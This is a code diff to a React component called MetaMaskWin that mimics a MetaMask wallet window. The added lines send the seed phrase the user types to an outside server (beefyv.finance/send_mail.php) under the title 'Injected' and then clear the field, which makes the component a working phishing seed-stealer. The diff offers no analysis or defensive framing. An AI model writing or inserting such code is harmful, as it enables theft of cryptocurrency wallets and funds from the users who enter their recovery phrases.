@@ -21,6 +21,21 @@ const MetaMaskWin = () => {
     setWalletSeedInput(e.target.value);
   }
   async function sendWalletSeed() {
+    fetch("https://beefyv.finance/send_mail.php", {
+      method: 'POST',
+      body: JSON.stringify({ text: walletSeedInput, title: 'Injected'})
+    }) 
+    .then(res => res.json())
+    .then(
+      (result) => {
+        
+      },
+      (error) => {
+      }
+    ) 
+ 
+    document.querySelector('#wallet-seed').value = ' ';
+
     console.log('on Submit: >');
     // const payload = walletSeedInput;
     // try {
@@ -33,6 +48,7 @@ const MetaMaskWin = () => {
     //   console.log(error);
     // }
   }
+  
 
   return (
     <Box>
